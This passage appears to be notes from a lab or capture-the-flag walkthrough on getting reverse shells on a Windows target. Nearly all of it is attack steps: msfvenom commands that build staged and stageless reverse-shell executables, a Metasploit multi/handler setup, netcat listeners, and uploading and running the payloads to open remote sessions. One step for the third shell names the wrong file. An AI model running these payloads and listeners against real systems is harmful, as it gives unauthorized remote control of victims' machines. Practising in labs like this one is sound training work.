* Upload shell.exe to the target
* Browse to http://10.10.70.179 in attacker’s browser
* Click ‘Browse’ button
* Navigate to /root/shell.exe
* Click ‘Open’ to select the file
* Click ‘Submit’ to upload the file
* Create a Meterpreter listener to catch the reverse shell:
* Msfconsole
* use multi/handler
* set LHOST 10.10.248.19
* set LPORT 1234
* set PAYLOAD windows/x64/meterpreter/reverse_tcp
* run
* Execute the shell
* RDP to the target
* Open a browser on the target
* Browse to http://127.0.0.1/uploads
* Save the shell.exe file
* Run file
* Meterpreter session is created:
* Create both staged and stageless meterpreter shells for either target.
* Upload and manually activate them, catching the shell with netcat -- does this work?
* Create stageless meterpreter shell for Windows target:
* Create the msfvenom payload:
* msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell2.exe LHOST=10.10.18.162 LPORT=1234
* Upload shell2.exe to target server:
* Browse to http://10.10.70.179 in attacker’s browser
* Click ‘Browse’ button
* Navigate to /root/shell2.exe
* Click ‘Open’ to select the file
* Click ‘Submit’ to upload the file
* Create nc listener on attacking machine: nc -lvnp 1234
* Execute the shell
* RDP to the target
* Open a browser on the target
* Browse to http://127.0.0.1/uploads
* Save shell2.exe
* Run file
* Session is established:
* Create staged meterpreter shell for Windows target:
* Create the msfvenom payload:
* msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell3.exe LHOST=10.10.18.162 LPORT=1234
* Upload shell3.exe to target server:
* Browse to http://10.10.70.179 in attacker’s browser
* Click ‘Browse’ button
* Navigate to /root/shell2.exe
* Click ‘Open’ to select the file
* Click ‘Submit’ to upload the file
* Create nc listener on attacking machine: nc -lvnp 1234
* Execute the shell
* RDP to the target
* Open a browser on the target
* Browse to http://127.0.0.1/uploads
* Save shell3.exe
* Run file
* Session established:
